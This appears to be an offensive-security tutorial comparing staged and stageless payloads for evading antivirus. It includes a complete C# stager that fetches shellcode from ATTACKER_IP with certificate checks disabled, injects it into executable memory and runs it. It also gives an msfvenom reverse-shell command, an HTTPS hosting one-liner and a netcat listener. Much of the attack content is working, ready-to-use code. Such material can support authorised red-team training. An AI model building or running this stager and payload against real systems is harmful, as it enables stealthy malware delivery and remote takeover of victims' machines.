When attempting to bypass Antivirus (AV) solutions, shellcode delivery generally follows **two main approaches**:

- **Stageless Payloads**
    
- **Staged Payloads**
    

Payloads are categorized based on **how the final shellcode is delivered and executed**. Each approach has distinct advantages depending on the attack environment.

---

## 🚀 Stageless Payloads

### 🔹 Definition

A **stageless payload** embeds the **entire final shellcode directly inside the executable**.  
Execution happens in **one single step**.

> Think of it as a fully packaged application that runs immediately when executed.

### 🔹 Execution Flow

`Victim executes payload         ↓ Embedded shellcode runs         ↓ Reverse shell / action triggered`

### ✅ Advantages

- All components are bundled into a **single executable**
    
- **No additional network requests** required
    
- Reduced chance of detection by **IPS / network monitoring**
    
- Ideal for **air-gapped or restricted networks**
    

### ❌ Disadvantages

- Larger binary size
    
- Shellcode is exposed if the payload is captured
    
- Less flexible (must recompile to change shellcode)
    

---

## 🧩 Staged Payloads

### 🔹 Definition

A **staged payload** uses a **small initial shellcode (stager)** whose sole purpose is to **download and execute the final shellcode in memory**.

### 🔹 Typical Two-Stage Flow

`Victim executes Stage0 (stager)         ↓ Stage0 connects to attacker server         ↓ Final shellcode downloaded         ↓ Shellcode injected into memory and executed`

### ✅ Advantages

- **Very small disk footprint**
    
- Final shellcode **never touches disk**
    
- Harder for AV solutions to detect
    
- Stage0 can be reused with multiple payloads
    
- Shellcode is protected from forensic extraction
    

### ❌ Disadvantages

- Requires **network connectivity**
    
- More network indicators (possible IDS alerts)
    

---

## ⚖️ Staged vs Stageless Comparison

| Feature            | Stageless | Staged     |
| ------------------ | --------- | ---------- |
| Disk footprint     | Large     | Small      |
| Network dependency | ❌ None    | ✅ Required |
| Shellcode exposure | High      | Low        |
| AV evasion         | Moderate  | High       |
| Flexibility        | Low       | High       |

---

## 🎯 When to Use Which?

### ✔ Use **Stageless Payloads** when:

- Target network is **isolated**
    
- USB drop attacks
    
- No outbound connections allowed
    
- Heavy perimeter security
    

### ✔ Use **Staged Payloads** when:

- Stealth is critical
    
- Want minimal disk artifacts
    
- Reusing shellcode across multiple targets
    
- Avoiding shellcode exposure
    

---

## 🧰 Stagers in Metasploit

Metasploit clearly distinguishes payload types by naming convention:

| Payload                               | Type      |
| ------------------------------------- | --------- |
| `windows/x64/shell_reverse_tcp`       | Stageless |
| `windows/x64/shell/reverse_tcp`       | Staged    |
| `windows/x64/meterpreter_reverse_tcp` | Stageless |
| `windows/x64/meterpreter/reverse_tcp` | Staged    |

> **Rule of Thumb:**  
> `_` → Stageless  
> `/` → Staged

---

## 🧪 Creating Your Own Stager (C#)

### 🔹 Purpose

This custom stager:

- Downloads shellcode over HTTPS
    
- Allocates executable memory
    
- Injects shellcode
    
- Executes it in-memory
    

---

### 🔹 Required WinAPI Functions

| Function                | Purpose                      |
| ----------------------- | ---------------------------- |
| `VirtualAlloc()`        | Allocate executable memory   |
| `CreateThread()`        | Execute shellcode            |
| `WaitForSingleObject()` | Synchronize thread execution |

---

### 🔹 Full Stager Code (C#)

`using System; using System.Net; using System.Runtime.InteropServices; using System.Security.Cryptography.X509Certificates;  public class Program {    [DllImport("kernel32")]   private static extern UInt32 VirtualAlloc(     UInt32 lpStartAddr, UInt32 size,     UInt32 flAllocationType, UInt32 flProtect   );    [DllImport("kernel32")]   private static extern IntPtr CreateThread(     UInt32 lpThreadAttributes, UInt32 dwStackSize,     UInt32 lpStartAddress, IntPtr param,     UInt32 dwCreationFlags, ref UInt32 lpThreadId   );    [DllImport("kernel32")]   private static extern UInt32 WaitForSingleObject(     IntPtr hHandle, UInt32 dwMilliseconds   );    private static UInt32 MEM_COMMIT = 0x1000;   private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;    public static void Main() {     string url = "https://ATTACKER_IP/shellcode.bin";     Stager(url);   }    public static void Stager(string url) {     WebClient wc = new WebClient();     ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };     ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;      byte[] shellcode = wc.DownloadData(url);      UInt32 codeAddr = VirtualAlloc(       0, (UInt32)shellcode.Length,       MEM_COMMIT, PAGE_EXECUTE_READWRITE     );      Marshal.Copy(shellcode, 0, (IntPtr)codeAddr, shellcode.Length);      UInt32 threadId = 0;     IntPtr thread = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref threadId);     WaitForSingleObject(thread, 0xFFFFFFFF);   } }`

---

## 🛠️ Compilation

`csc staged-payload.cs`

---

## 🌐 Hosting the Final Shellcode

### 🔹 Generate Shellcode

`msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=ATTACKER_IP LPORT=7474 \ -f raw -o shellcode.bin -b '\x00\x0a\x0d'`

---

### 🔹 Create Self-Signed Certificate

`openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes`

---

### 🔹 Start HTTPS Server

`python3 -c " import http.server, ssl; server_address=('0.0.0.0',443); httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler); httpd.socket=ssl.wrap_socket(   httpd.socket,   server_side=True,   certfile='localhost.pem',   ssl_version=ssl.PROTOCOL_TLSv1_2 ); httpd.serve_forever()"`

---

## 📡 Listener Setup

`nc -lvp 7474`

---

## 🧠 Key Takeaways

- No payload type is universally “better”
    
- **Context and environment dictate payload choice**
    
- Staged payloads excel in stealth and flexibility
    
- Stageless payloads excel in restricted networks